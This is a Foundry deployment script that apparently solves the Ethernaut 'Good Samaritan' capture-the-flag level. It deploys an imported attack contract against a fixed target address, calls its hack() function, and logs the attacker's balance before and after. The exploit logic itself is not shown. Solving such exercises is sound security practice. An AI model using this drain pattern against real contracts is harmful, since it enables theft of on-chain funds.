//SPDX-LICENSE-IDENTIFIER: UNLICENSED
// 0x190fb37f830D633F6Fc03ACE5531373b0f676b99
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/GoodSamaritan.sol";
import "../src/HackGoodSamaritan.sol";

contract DeployGoodSamaritan is Script {
    address player = 0x8656D273630865bB4887E00d86a338A214Ac4b50;

    GoodSamaritan public goodSamaritan = GoodSamaritan(0x190fb37f830D633F6Fc03ACE5531373b0f676b99);
    HackGoodSamaritan public hackGoodSamaritan;

    function run() public {
        vm.startBroadcast(player);
            hackGoodSamaritan = new HackGoodSamaritan(address(goodSamaritan));
        vm.stopBroadcast();
        
        vm.label(player, "Player");
        vm.label(address(goodSamaritan), "GoodSamaritan");
        vm.label(address(hackGoodSamaritan), "HackGoodSamaritan");

        console.log("Hacker balance pre: %i", hackGoodSamaritan.balance());
        vm.startBroadcast(player);
            hackGoodSamaritan.hack();
        vm.stopBroadcast();
        console.log("Hacker balance post: %i", hackGoodSamaritan.balance());
    }
}